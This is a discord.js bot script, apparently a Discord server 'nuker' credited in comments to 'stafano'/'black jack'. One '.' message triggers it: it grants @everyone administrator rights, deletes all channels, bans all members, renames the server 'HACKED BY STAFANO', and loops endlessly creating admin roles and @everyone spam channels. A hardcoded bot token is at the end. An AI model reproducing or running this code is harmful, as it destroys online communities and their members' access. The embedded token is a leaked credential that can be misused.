const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          
/////Ban all

////

          
client.on("ready", () => {
  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log('hack by stafano');/////BLACK JACK 
console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
 client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
  console.log(`Logined`)
})
///created by black jack 
client.on('message', message => {
    if (message.content.toLowerCase() === '.') {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        let oldnm = message.guild.name;
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach( member => {
          
          member.ban()
      })
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED BY STAFANO",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        message.guild.setIcon("");
        message.guild.setName('HACKED BY STAFANO');
        setTimeout(function() {
            setInterval(() => {
          
                message.guild.createChannel('hack by stafano', 'text').then(channel => {
                channel.send('@everyone HACK BY STAFANO:joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
})  

 ////codaka drwst krawa lalayan black jack

client.login("NzY0MTgzOTk3Mzk0NzE0NjQ1.X4Cjzg.bDS4Yq6CYrA7hXxZN8BbG7vuZIg")
          